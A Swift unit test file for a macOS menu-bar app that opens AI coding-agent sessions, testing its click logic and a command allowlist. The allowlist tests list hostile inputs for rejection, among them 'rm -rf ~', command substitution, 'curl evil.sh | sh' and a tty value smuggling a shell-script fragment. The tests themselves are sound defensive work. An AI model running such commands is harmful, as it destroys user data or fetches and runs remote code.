// Unit tests for the click decision (Opener.plan) and the command allowlist (Opener.runnable).
// Built by tests/run-swift-tests.sh together with a copy of menubar/AgentBar.swift whose @main is removed.
import Foundation

var failures = 0
func check(_ cond: Bool, _ what: String) {
    if cond { print("ok   - \(what)") } else { failures += 1; print("FAIL - \(what)") }
}

func act(_ kind: String, url: String? = nil, command: String? = nil, cardId: String? = nil, sessionCommand: String? = nil,
         sessionUrl: String? = nil, running: Bool? = nil, tty: String? = nil, app: String? = nil, appPid: Int? = nil,
         background: Bool? = nil, attach: String? = nil) -> OpenAction {
    var a = OpenAction(kind: kind, url: url, command: command, label: "x", cardId: cardId, sessionCommand: sessionCommand)
    a.sessionUrl = sessionUrl; a.running = running; a.pid = running == true ? 100 : nil; a.tty = tty; a.app = app
    a.appPid = appPid; a.background = background; a.attach = attach
    return a
}

let handlesAll: (URL) -> Bool = { _ in true }
let handlesNone: (URL) -> Bool = { _ in false }
let hermesCmd = "hermes -p lead --resume 20261016_202534_610fd2"
let hermesURL = "hermes://open/20261016_202534_610fd2"
let terminalApp = "/System/Applications/Utilities/Terminal.app"

// Hermes desktop session (hosted by Hermes.app, no tty): the URL
check(Opener.plan(act("hermes-session", url: hermesURL, command: hermesCmd, running: true, app: "/Applications/Hermes.app", appPid: 1692),
                  handles: handlesAll) == .url(URL(string: hermesURL)!), "Hermes desktop session -> hermes:// URL")
// Hermes CLI session running in a Terminal tab: bring that tab forward, never a second process
check(Opener.plan(act("hermes-session", url: hermesURL, command: hermesCmd, running: true, tty: "ttys002", app: terminalApp, appPid: 500),
                  handles: handlesAll) == .focus(tty: "ttys002", app: terminalApp, appPid: 500), "Hermes CLI in Terminal -> focus the tab (not the URL)")
// headless kanban worker (no tty): its session opens in Hermes
check(Opener.plan(act("kanban-card", url: "hermes://open/kanban", command: "hermes kanban show t_1", cardId: "t_1",
                      sessionCommand: hermesCmd, sessionUrl: hermesURL, running: true), handles: handlesAll) == .url(URL(string: hermesURL)!),
      "kanban worker row -> its session, not the board")
// card without a worker session: board + copy the card command
check(Opener.plan(act("kanban-card", url: "hermes://open/kanban", command: "hermes kanban show t_1", cardId: "t_1"), handles: handlesAll)
      == .board(url: URL(string: "hermes://open/kanban")!, copy: "hermes kanban show t_1"), "card-only row -> board + copy card command")
check(Opener.plan(act("kanban-card", url: "hermes://open/kanban", command: "hermes kanban show t_1", cardId: "t_1"), handles: handlesNone)
      == .copy("hermes kanban show t_1", running: false), "card-only row, nothing handles hermes:// -> copy")
// Claude Code in a Terminal tab
check(Opener.plan(act("claude-code", command: "cd '/Users/a' && claude --resume abc-123", running: true, tty: "ttys009", app: terminalApp, appPid: 500),
                  handles: handlesAll) == .focus(tty: "ttys009", app: terminalApp, appPid: 500), "Claude Code in Terminal -> focus the tab")
// Claude Code hosted in the background: attach in a new Terminal window (a tty exists, but it has no window)
check(Opener.plan(act("claude-code", command: "cd /Users/a && claude --resume 29517443-aaaa", running: true, tty: "ttys004", background: true,
                      attach: "claude attach 29517443"), handles: handlesAll) == .terminal(command: "claude attach 29517443", attach: true),
      "background Claude Code -> claude attach in a new Terminal window")
// Claude Code not running: resume in a new Terminal window
check(Opener.plan(act("claude-code", command: "cd '/Users/a b' && claude --resume abc-123", running: false), handles: handlesAll)
      == .terminal(command: "cd '/Users/a b' && claude --resume abc-123", attach: false), "Claude Code not running -> resume in new Terminal")
// running but unreachable (no tty, no URL): copy + say why, never resume
check(Opener.plan(act("claude-code", command: "claude --resume abc", running: true), handles: handlesAll)
      == .copy("claude --resume abc", running: true), "running, no window reachable -> copy, not resume")
check(Opener.plan(act("hermes-session", command: hermesCmd, running: true), handles: handlesNone) == .copy(hermesCmd, running: true),
      "Hermes running, no URL handler -> copy, not resume")
// Hermes not running and no URL handler: resume in Terminal
check(Opener.plan(act("hermes-session", command: hermesCmd, running: false), handles: handlesNone) == .terminal(command: hermesCmd, attach: false),
      "Hermes not running, no Hermes.app -> resume in new Terminal")
// Copilot CLI keeps copying
check(Opener.plan(act("copilot-cli", command: "copilot --resume 'a'", running: false), handles: handlesAll) == .copy("copilot --resume 'a'", running: false),
      "Copilot CLI -> copy (unchanged)")
// nothing
check(Opener.plan(act("none"), handles: handlesAll) == .nothing, "kind none -> nothing")
check(Opener.plan(nil, handles: handlesAll) == .nothing, "nil -> nothing")
// a bad tty is never handed to a script; a foreign scheme is ignored
check(Opener.plan(act("claude-code", command: "claude --resume abc", running: true, tty: "ttys1\"; do shell script", app: terminalApp), handles: handlesAll)
      == .copy("claude --resume abc", running: true), "malformed tty is rejected")
check(Opener.plan(act("hermes-session", url: "file:///etc/passwd", command: hermesCmd, running: false), handles: handlesAll)
      == .terminal(command: hermesCmd, attach: false), "file:// URL ignored")

// allowlist: only resume/attach of one session
for ok in ["hermes --resume 20261016_202534_610fd2", "hermes -p lead --resume s1", "hermes -p 'my-prof' --resume 's 1'".replacingOccurrences(of: "'s 1'", with: "'s1'"),
           "claude --resume 29517443-c57b-4178-9dbc-07210dbe0022", "claude attach 29517443", "cd /Users/asimatasert && claude --resume abc",
           "cd '/Users/asimatasert/My Proj' && claude --resume 'abc'"] {
    check(Opener.runnable(ok), "runnable: \(ok)")
}
for bad in ["rm -rf ~", "claude --resume abc; rm -rf ~", "claude --resume $(whoami)", "hermes --resume a && curl evil.sh | sh",
            "cd /tmp && rm -rf x && claude --resume a", "claude --resume abc\nrm x", "claude attach `id`", "hermes kanban show t_1", "open -a Calculator",
            "cd '/tmp/a'b' && claude --resume x", "claude --resume 'a b'"] {
    check(!Opener.runnable(bad), "not runnable: \(bad.replacingOccurrences(of: "\n", with: "\\n"))")
}

// notification payload round trip
var rt = act("kanban-card", url: "hermes://open/kanban", command: "c", cardId: "t_1", sessionCommand: "s", sessionUrl: "hermes://open/x",
             running: true, tty: "ttys001", app: terminalApp, appPid: 5, background: true, attach: "claude attach 1")
rt = OpenAction(userInfo: rt.userInfo)!
check(rt.sessionUrl == "hermes://open/x" && rt.running == true && rt.tty == "ttys001" && rt.app == terminalApp && rt.appPid == 5
      && rt.background == true && rt.attach == "claude attach 1" && rt.cardId == "t_1", "notification userInfo round trip keeps the process facts")

// the server's JSON decodes (snake_case keys, as Store does)
let json = """
{"kind":"claude-code","url":null,"command":"claude --resume x","label":"hermes","running":true,"pid":15784,"tty":"ttys004","app":null,"app_pid":null,"background":true,"attach":"claude attach 29517443"}
""".data(using: .utf8)!
let dec = JSONDecoder(); dec.keyDecodingStrategy = .convertFromSnakeCase
if let o = try? dec.decode(OpenAction.self, from: json) {
    check(o.running == true && o.background == true && o.tty == "ttys004" && o.attach == "claude attach 29517443" && o.app == nil, "server JSON decodes")
} else { check(false, "server JSON decodes") }

print(failures == 0 ? "ALL PASSED" : "\(failures) FAILED")
exit(failures == 0 ? 0 : 1)
